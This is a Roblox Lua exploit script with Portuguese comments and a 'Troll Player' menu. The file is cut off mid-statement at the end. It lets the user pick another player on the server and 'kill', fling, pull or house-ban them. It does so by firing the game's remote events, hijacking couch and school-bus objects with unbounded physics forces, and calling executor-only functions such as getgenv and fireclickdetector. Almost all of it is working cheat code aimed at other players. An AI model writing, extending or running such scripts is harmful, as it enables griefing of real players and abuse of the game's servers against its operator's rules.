game:GetService("ReplicatedStorage")\nlocal VirtualInputManager = game:GetService("VirtualInputManager")\nlocal RunService = game:GetService("RunService")\nlocal cam = workspace.CurrentCamera\n\n\nlocal selectedPlayerName = nil\nlocal methodKill = nil\ngetgenv().Target = nil\nlocal Character = LocalPlayer.Character\nlocal Humanoid = Character and Character:WaitForChild("Humanoid")\nlocal RootPart = Character and Character:WaitForChild("HumanoidRootPart")\n\n-- Fun\231\227o para limpar o sof\225 (couch)\nlocal function cleanupCouch()\n    local char = LocalPlayer.Character\n    if char then\n        local couch = char:FindFirstChild("Chaos.Couch") or LocalPlayer.Backpack:FindFirstChild("Chaos.Couch")\n        if couch then\n            couch:Destroy()\n        end\n    end\n    -- Limpar ferramentas via remoto\n    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")\nend\n\n-- Conectar evento CharacterAdded\nLocalPlayer.CharacterAdded:Connect(function(newCharacter)\n    Character = newCharacter\n    Humanoid = newCharacter:WaitForChild("Humanoid")\n    RootPart = newCharacter:WaitForChild("HumanoidRootPart")\n    cleanupCouch()\n    \n    -- Conectar evento Died para o novo Humanoid\n    Humanoid.Died:Connect(function()\n        cleanupCouch()\n    end)\nend)\n\n-- Conectar evento Died para o Humanoid inicial, se existir\nif Humanoid then\n    Humanoid.Died:Connect(function()\n        cleanupCouch()\n    end)\nend\n\n-- Fun\231\227o KillPlayerCouch\nlocal function KillPlayerCouch()\n    if not selectedPlayerName then\n        warn("Erro: Nenhum jogador selecionado")\n        return\n    end\n    local target = Players:FindFirstChild(selectedPlayerName)\n    if not target or not target.Character then\n        warn("Erro: Jogador alvo n\227o encontrado ou sem personagem")\n        return\n    end\n\n    local char = LocalPlayer.Character\n    if not char then\n        warn("Erro: Personagem do jogador local n\227o encontrado")\n        return\n    end\n    local hum = char:FindFirstChildOfClass("Humanoid")\n    local root = char:FindFirstChild("HumanoidRootPart")\n    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")\n    if not hum or not root or not tRoot then\n        warn("Erro: Componentes necess\225rios n\227o encontrados")\n        return\n    end\n\n    local originalPos = root.Position \n    local sitPos = Vector3.new(145.51, -350.09, 21.58)\n\n    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")\n    task.wait(0.2)\n\n    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n    task.wait(0.3)\n\n    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")\n    if tool then tool.Parent = char end\n    task.wait(0.1)\n\n    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)\n    task.wait(0.1)\n\n    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n    hum.PlatformStand = false\n    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum\n\n    local align = Instance.new("BodyPosition")\n    align.Name = "BringPosition"\n    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n    align.D = 10\n    align.P = 30000\n    align.Position = root.Position\n    align.Parent = tRoot\n\n    task.spawn(function()\n        local angle = 0\n        local startTime = tick()\n        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do\n            local tHum = target.Character:FindFirstChildOfClass("Humanoid")\n            if not tHum or tHum.Sit then break end\n\n            local hrp = target.Character.HumanoidRootPart\n            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)\n\n            angle += 50\n            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)\n            align.Position = root.Position + Vector3.new(2, 0, 0)\n\n            task.wait()\n        end\n\n        align:Destroy()\n        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n        hum.PlatformStand = false\n        cam.CameraSubject = hum\n\n        for _, p in pairs(char:GetDescendants()) do\n            if p:IsA("BasePart") then\n                p.Velocity = Vector3.zero\n                p.RotVelocity = Vector3.zero\n            end\n        end\n\n        task.wait(0.1)\n        root.CFrame = CFrame.new(sitPos)\n        task.wait(0.3)\n\n        local tool = char:FindFirstChild("Couch")\n        if tool then tool.Parent = LocalPlayer.Backpack end\n\n        task.wait(0.01)\n        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n        task.wait(0.2)\n        root.CFrame = CFrame.new(originalPos)\n    end)\nend\n\n-- Fun\231\227o BringPlayerLLL\nlocal function BringPlayerLLL()\n    if not selectedPlayerName then\n        warn("Erro: Nenhum jogador selecionado")\n        return\n    end\n    local target = Players:FindFirstChild(selectedPlayerName)\n    if not target or not target.Character then\n        warn("Erro: Jogador alvo n\227o encontrado ou sem personagem")\n        return\n    end\n\n    local char = LocalPlayer.Character\n    if not char then\n        warn("Erro: Personagem do jogador local n\227o encontrado")\n        return\n    end\n    local hum = char:FindFirstChildOfClass("Humanoid")\n    local root = char:FindFirstChild("HumanoidRootPart")\n    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")\n    if not hum or not root or not tRoot then\n        warn("Erro: Componentes necess\225rios n\227o encontrados")\n        return\n    end\n\n    local originalPos = root.Position \n    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")\n    task.wait(0.2)\n\n    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n    task.wait(0.3)\n\n    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")\n    if tool then\n        tool.Parent = char\n    end\n    task.wait(0.1)\n\n    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)\n    task.wait(0.1)\n\n    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n    hum.PlatformStand = false\n    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum\n\n    local align = Instance.new("BodyPosition")\n    align.Name = "BringPosition"\n    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n    align.D = 10\n    align.P = 30000\n    align.Position = root.Position\n    align.Parent = tRoot\n\n    task.spawn(function()\n        local angle = 0\n        local startTime = tick()\n        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do\n            local tHum = target.Character:FindFirstChildOfClass("Humanoid")\n            if not tHum or tHum.Sit then break end\n\n            local hrp = target.Character.HumanoidRootPart\n            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)\n\n            angle += 50\n            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)\n            align.Position = root.Position + Vector3.new(2, 0, 0)\n\n            task.wait()\n        end\n\n        align:Destroy()\n        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n        hum.PlatformStand = false\n        cam.CameraSubject = hum\n\n        for _, p in pairs(char:GetDescendants()) do\n            if p:IsA("BasePart") then\n                p.Velocity = Vector3.zero\n                p.RotVelocity = Vector3.zero\n            end\n        end\n\n        task.wait(0.1)\n        root.Anchored = true\n        root.CFrame = CFrame.new(originalPos)\n        task.wait(0.001)\n        root.Anchored = false\n\n        task.wait(0.7)\n        local tool = char:FindFirstChild("Couch")\n        if tool then\n            tool.Parent = LocalPlayer.Backpack\n        end\n\n        task.wait(0.001)\n        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")\n    end)\nend\n\n-- Fun\231\227o BringWithCouch\nlocal function BringWithCouch()\n    local targetPlayer = Players:FindFirstChild(getgenv().Target)\n    if not targetPlayer then\n        warn("Erro: Nenhum jogador alvo selecionado")\n        return\n    end\n    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then\n        warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")\n        return\n    end\n\n    local args = { [1] = "ClearAllTools" }\n    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))\n    local args = { [1] = "PickingTools", [2] = "Couch" }\n    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))\n\n    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)\n    if not couch then\n        warn("Erro: Sof\225 n\227o encontrado no Backpack")\n        return\n    end\n\n    couch.Name = "Chaos.Couch"\n    local seat1 = couch:FindFirstChild("Seat1")\n    local seat2 = couch:FindFirstChild("Seat2")\n    local handle = couch:FindFirstChild("Handle")\n    if seat1 and seat2 and handle then\n        seat1.Disabled = true\n        seat2.Disabled = true\n        handle.Name = "Handle "\n    else\n        warn("Erro: Componentes do sof\225 n\227o encontrados")\n        return\n    end\n    couch.Parent = LocalPlayer.Character\n\n    local tet = Instance.new("BodyVelocity", seat1)\n    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n    tet.P = 1250\n    tet.Velocity = Vector3.new(0, 0, 0)\n    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\n\n    repeat\n        for m = 1, 35 do\n            local pos = { x = 0, y = 0, z = 0 }\n            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart\n            if not tRoot then break end\n            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)\n            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)\n            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)\n            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)\n            task.wait()\n        end\n        tet:Destroy()\n        couch.Parent = LocalPlayer.Backpack\n        task.wait()\n        couch:FindFirstChild("Handle ").Name = "Handle"\n        task.wait(0.2)\n        couch.Parent = LocalPlayer.Character\n        task.wait()\n        couch.Parent = LocalPlayer.Backpack\n        couch.Handle.Name = "Handle "\n        task.wait(0.2)\n        couch.Parent = LocalPlayer.Character\n        tet = Instance.new("BodyVelocity", seat1)\n        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n        tet.P = 1250\n        tet.Velocity = Vector3.new(0, 0, 0)\n        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\n    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true\n    task.wait()\n    tet:Destroy()\n    couch.Parent = LocalPlayer.Backpack\n    task.wait()\n    couch:FindFirstChild("Handle ").Name = "Handle"\n    task.wait(0.3)\n    couch.Parent = LocalPlayer.Character\n    task.wait(0.3)\n    couch.Grip = CFrame.new(Vector3.new(0, 0, 0))\n    task.wait(0.3)\n    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")\nend\n\n-- Fun\231\227o KillWithCouch\nlocal function KillWithCouch()\n    local targetPlayer = Players:FindFirstChild(getgenv().Target)\n    if not targetPlayer then\n        warn("Erro: Nenhum jogador alvo selecionado")\n        return\n    end\n    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then\n        warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")\n        return\n    end\n\n    local args = { [1] = "ClearAllTools" }\n    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))\n    local args = { [1] = "PickingTools", [2] = "Couch" }\n    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))\n\n    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)\n    if not couch then\n        warn("Erro: Sof\225 n\227o encontrado no Backpack")\n        return\n    end\n\n    couch.Name = "Chaos.Couch"\n    local seat1 = couch:FindFirstChild("Seat1")\n    local seat2 = couch:FindFirstChild("Seat2")\n    local handle = couch:FindFirstChild("Handle")\n    if seat1 and seat2 and handle then\n        seat1.Disabled = true\n        seat2.Disabled = true\n        handle.Name = "Handle "\n    else\n        warn("Erro: Componentes do sof\225 n\227o encontrados")\n        return\n    end\n    couch.Parent = LocalPlayer.Character\n\n    local tet = Instance.new("BodyVelocity", seat1)\n    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n    tet.P = 1250\n    tet.Velocity = Vector3.new(0, 0, 0)\n    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\n\n    repeat\n        for m = 1, 35 do\n            local pos = { x = 0, y = 0, z = 0 }\n            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart\n            if not tRoot then break end\n            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)\n            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)\n            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)\n            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)\n            task.wait()\n        end\n        tet:Destroy()\n        couch.Parent = LocalPlayer.Backpack\n        task.wait()\n        couch:FindFirstChild("Handle ").Name = "Handle"\n        task.wait(0.2)\n        couch.Parent = LocalPlayer.Character\n        task.wait()\n        couch.Parent = LocalPlayer.Backpack\n        couch.Handle.Name = "Handle "\n        task.wait(0.2)\n        couch.Parent = LocalPlayer.Character\n        tet = Instance.new("BodyVelocity", seat1)\n        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n        tet.P = 1250\n        tet.Velocity = Vector3.new(0, 0, 0)\n        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\n    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true\n    task.wait()\n    couch.Parent = LocalPlayer.Backpack\n    seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))\n    seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))\n    couch.Parent = LocalPlayer.Character\n    task.wait(0.1)\n    couch.Parent = LocalPlayer.Backpack\n    task.wait(2)\n    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")\n    if bv then bv:Destroy() end\n    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")\nend\n\n    local PlayerSection = Troll:AddSection({ Name = "Troll Player" })\n\n    -- Fun\231\227o para obter lista de jogadores\n    local function getPlayerList()\n        local players = Players:GetPlayers()\n        local playerNames = {}\n        for _, player in ipairs(players) do\n            if player ~= LocalPlayer then\n                table.insert(playerNames, player.Name)\n            end\n        end\n        return playerNames\n    end\n\n    local killDropdown = Troll:AddDropdown({\n        Name = "SELECIONAR JOGADOR",\n        Options = getPlayerList(),\n        Default = "",\n        Callback = function(value)\n            selectedPlayerName = value\n            getgenv().Target = value\n            print("Jogador selecionado: " .. tostring(value))\n        end\n    })\n\n    Troll:AddButton({\n        Name = "ATUALIZAR LISTA",\n        Callback = function()\n            local tablePlayers = Players:GetPlayers()\n            local newPlayers = {}\n            if killDropdown and #tablePlayers > 0 then\n                for _, player in ipairs(tablePlayers) do\n                    if player.Name ~= LocalPlayer.Name then\n                        table.insert(newPlayers, player.Name)\n                    end\n                end\n                killDropdown:Set(newPlayers)\n                print("Lista de jogadores atualizada: ", table.concat(newPlayers, ", "))\n                if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then\n                    selectedPlayerName = nil\n                    getgenv().Target = nil\n                    killDropdown:SetValue("")\n                    print("Sele\231\227o resetada, jogador n\227o est\225 mais no servidor.")\n                end\n            else\n                print("Erro: Dropdown n\227o encontrado ou nenhum jogador dispon\237vel.")\n            end\n        end\n    })\n\n    Troll:AddButton({\n        Name = "TP JOGADOR",\n        Callback = function()\n            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then\n                print("Erro: Player n\227o selecionado ou n\227o existe")\n                return\n            end\n            local character = LocalPlayer.Character\n            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")\n            if not humanoidRootPart then\n                warn("Erro: HumanoidRootPart do jogador local n\227o encontrado")\n                return\n            end\n\n            local targetPlayer = Players:FindFirstChild(selectedPlayerName)\n            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then\n                humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame\n            else\n                print("Erro: Player alvo n\227o encontrado ou sem HumanoidRootPart")\n            end\n        end\n    })\n\n    Troll:AddToggle({\n        Name = "OLHA JOGADOR",\n        Default = false,\n        Callback = function(value)\n            local Camera = workspace.CurrentCamera\n\n            local function UpdateCamera()\n                if value then\n                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)\n                    if targetPlayer and targetPlayer.Character then\n                        local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")\n                        if humanoid then\n                            Camera.CameraSubject = humanoid\n                        end\n                    end\n                else\n                    if LocalPlayer.Character then\n                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")\n                        if humanoid then\n                            Camera.CameraSubject = humanoid\n                        end\n                    end\n                end\n            end\n\n            if value then\n                if not getgenv().CameraConnection then\n                    getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera)\n                end\n            else\n                if getgenv().CameraConnection then\n                    getgenv().CameraConnection:Disconnect()\n                    getgenv().CameraConnection = nil\n                end\n                UpdateCamera()\n            end\n        end\n    })\n\n    local MethodSection = Troll:AddSection({ Name = "M\201TODOS" })\n\n    Troll:AddDropdown({\n        Name = "SELECIONAR METADO",\n        Options = {"\212NIBUS", "SOFA", "SOFA V2"},\n        Default = "",\n        Callback = function(value)\n            methodKill = value\n            print("M\233todo selecionado: " .. tostring(value))\n        end\n    })\n\n    Troll:AddButton({\n        Name = "ELIMINAR JOGADOR",\n        Callback = function()\n            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then\n                print("Erro: Player n\227o selecionado ou n\227o existe")\n                return\n            end\n            if methodKill == "SOFA" then\n                KillPlayerCouch()\n            elseif methodKill == "SOFA V2" then\n                KillWithCouch()\n            else\n                -- M\233todo de \244nibus\n                local character = LocalPlayer.Character\n                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")\n                if not humanoidRootPart then\n                    warn("Erro: HumanoidRootPart do jogador local n\227o encontrado")\n                    return\n                end\n\n                local originalPosition = humanoidRootPart.CFrame\n\n                local function GetBus()\n                    local vehicles = game.Workspace:FindFirstChild("Vehicles")\n                    if vehicles then\n                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")\n                    end\n                    return nil\n                end\n\n                local bus = GetBus()\n\n                if not bus then\n                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)\n                    task.wait(0.5)\n                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")\n                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then\n                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")\n                    end\n                    task.wait(1)\n                    bus = GetBus()\n                end\n\n                if bus then\n                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")\n                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then\n                        repeat\n                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)\n                            task.wait()\n                        until character.Humanoid.Sit or not bus.Parent\n                        if character.Humanoid.Sit or not bus.Parent then\n                            for k, v in pairs(bus.Body:GetChildren()) do\n                                if v:IsA("Seat") then\n                                    v.CanTouch = false\n                                end\n                            end\n                        end\n                    end\n                end\n\n                local function TrackPlayer()\n                    while true do\n                        if selectedPlayerName then\n                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)\n                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then\n                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")\n                                if targetHumanoid and targetHumanoid.Sit then\n                                    if character.Humanoid then\n                                        bus:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))\n                                        print("Jogador sentou, levando \244nibus para o void!")\n                                        task.wait(0.2)\n\n                                        local function simulateJump()\n                                            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")\n                                            if humanoid then\n                                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)\n                                            end\n                                        end\n\n                                        simulateJump()\n                                        print("Simulando pulo!")\n                                        task.wait(0.5)\n                                        humanoidRootPart.CFrame = originalPosition\n                                        print("Player voltou para a posi\231\227o inicial.")\n                                    end\n                                    break\n                                else\n                                    local targetRoot = targetPlayer.Character.HumanoidRootPart\n                                    local time = tick() * 35\n                                    local lateralOffset = math.sin(time) * 4\n                                    local frontBackOffset = math.cos(time) * 20\n                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))\n                                end\n                            end\n                        end\n                        RunService.RenderStepped:Wait()\n                    end\n                end\n\n                spawn(TrackPlayer)\n            end\n        end\n    })\n\n    Troll:AddButton({\n        Name = "PUXAR JOGADOR",\n        Callback = function()\n            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then\n                print("Erro: Player n\227o selecionado ou n\227o existe")\n                return\n            end\n            if methodKill == "SOFA" then\n                BringPlayerLLL()\n            elseif methodKill == "SOFA V2" then\n                BringWithCouch()\n            else\n                -- M\233todo de \244nibus\n                local character = LocalPlayer.Character\n                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")\n                if not humanoidRootPart then\n                    warn("Erro: HumanoidRootPart do jogador local n\227o encontrado")\n                    return\n                end\n\n                local originalPosition = humanoidRootPart.CFrame\n\n                local function GetBus()\n                    local vehicles = game.Workspace:FindFirstChild("Vehicles")\n                    if vehicles then\n                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")\n                    end\n                    return nil\n                end\n\n                local bus = GetBus()\n\n                if not bus then\n                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)\n                    task.wait(0.5)\n                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")\n                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then\n                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")\n                    end\n                    task.wait(1)\n                    bus = GetBus()\n                end\n\n                if bus then\n                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")\n                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then\n                        repeat\n                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)\n                            task.wait()\n                        until character.Humanoid.Sit or not bus.Parent\n                    end\n                end\n\n                local function TrackPlayer()\n                    while true do\n                        if selectedPlayerName then\n                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)\n                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then\n                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")\n                                if targetHumanoid and targetHumanoid.Sit then\n                                    if character.Humanoid then\n                                        bus:SetPrimaryPartCFrame(originalPosition)\n                                        task.wait(0.7)\n                                        local args = { [1] = "DeleteAllVehicles" }\n                                        ReplicatedStorage.RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))\n                                    end\n                                    break\n                                else\n                                    local targetRoot = targetPlayer.Character.HumanoidRootPart\n                                    local time = tick() * 35\n                                    local lateralOffset = math.sin(time) * 4\n                                    local frontBackOffset = math.cos(time) * 20\n                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))\n                                end\n                            end\n                        end\n                        RunService.RenderStepped:Wait()\n                    end\n                end\n\n                spawn(TrackPlayer)\n            end\n        end\n    })\n\n\nlocal function houseBanKill()\n    if not selectedPlayerName then\n        print("Nenhum jogador selecionado!")\n        return\n    end\n\n    local Player = game.Players.LocalPlayer\n    local Backpack = Player.Backpack\n    local Character = Player.Character\n    local Humanoid = Character:FindFirstChildOfClass("Humanoid")\n    local RootPart = Character:FindFirstChild("HumanoidRootPart")\n    local Houses = game.Workspace:FindFirstChild("001_Lots")\n    local OldPos = RootPart.CFrame\n    local Angles = 0\n    local Vehicles = Workspace.Vehicles\n    local Pos\n\n    function Check()\n        if Player and Character and Humanoid and RootPart and Vehicles then\n            return true\n        else\n            return false\n        end\n    end\n\n    local selectedPlayer = game.Players:FindFirstChild(selectedPlayerName)\n    if selectedPlayer and selectedPlayer.Character then\n        if Check() then\n            local House = Houses:FindFirstChild(Player.Name .. "House")\n            if not House then\n                local EHouse\n                local availableHouses = {}\n                \n                -- Coletar todas as casas dispon\195\173veis ("For Sale")\n                for _, Lot in pairs(Houses:GetChildren()) do\n                    if Lot.Name == "For Sale" then\n                        for _, num in pairs(Lot:GetDescendants()) do\n                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then\n                                table.insert(availableHouses, {Lot = Lot, Number = num.Value})\n                                break\n                            end\n                        end\n                    end\n                end\n\n                -- Escolher uma casa aleat\195\179ria da lista\n                if #availableHouses > 0 then\n                    local randomHouse = availableHouses[math.random(1, #availableHouses)]\n                    EHouse = randomHouse.Lot\n                    local houseNumber = randomHouse.Number\n\n                    -- Teleportar para o BuyDetector e clicar\n                    local BuyDetector = EHouse:FindFirstChild("BuyHouse")\n                    Pos = BuyDetector.Position\n                    if BuyDetector and BuyDetector:IsA("BasePart") then\n                        RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)\n                        task.wait(0.5)\n                        local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")\n                        if ClickDetector then\n                            fireclickdetector(ClickDetector)\n                        end\n                    end\n\n                    -- Disparar o novo remote event para construir a casa\n                    task.wait(0.5)\n                    local args = {\n                        houseNumber, -- N\195\186mero da casa aleat\195\179ria\n                        "056_House" -- Tipo da casa\n                    }\n                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(unpack(args))\n                else\n                    print("Nenhuma casa dispon\195\173vel para compra!")\n                    return\n                end\n            end\n\n            task.wait(0.5)\n            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")\n            if PreHouse then\n                task.wait(0.5)\n                local Number\n                for i, x in pairs(PreHouse:GetDescendants()) do\n                    if x.Name == "Number" and x:IsA("NumberValue") then\n                        Number = x\n                    end\n                end\n                task.wait(0.5)\n                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)\n            end\n\n            task.wait(0.5)\n            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")\n            if not PCar then\n                if Check() then\n                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)\n                    task.wait(0.5)\n                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")\n                    task.wait(0.5)\n                    local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")\n                    task.wait(0.5)\n                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")\n                    if Seat then\n                        repeat\n                            task.wait()\n                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)\n                        until Humanoid.Sit\n                    end\n                end\n            end\n\n            task.wait(0.5)\n            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")\n            if PCar then\n                if not Humanoid.Sit then\n                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")\n                    if Seat then\n                        repeat\n                            task.wait()\n                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)\n                        until Humanoid.Sit\n                    end\n                end\n\n                local Target = selectedPlayer\n                local TargetC = Target.Character\n                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")\n                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")\n                if TargetC and TargetH and TargetRP then\n                    if not TargetH.Sit then\n                        while not TargetH.Sit do\n                            task.wait()\n                            local Fling = function(alvo, pos, angulo)\n                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)\n                            end\n                            Angles = Angles + 100\n                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                            Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                            Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))\n                        end\n                        task.wait(0.2)\n                        local House = Houses:FindFirstChild(Player.Name .. "House")\n                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))\n                        task.wait(0.2)\n                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30))\n                        local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)\n                        for i, v in pairs(a) do\n                            if v.Name == "HumanoidRootPart" then\n                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)\n                                local args = {\n                                    [1] = "BanPlayerFromHouse",\n                                    [2] = b,\n                                    [3] = 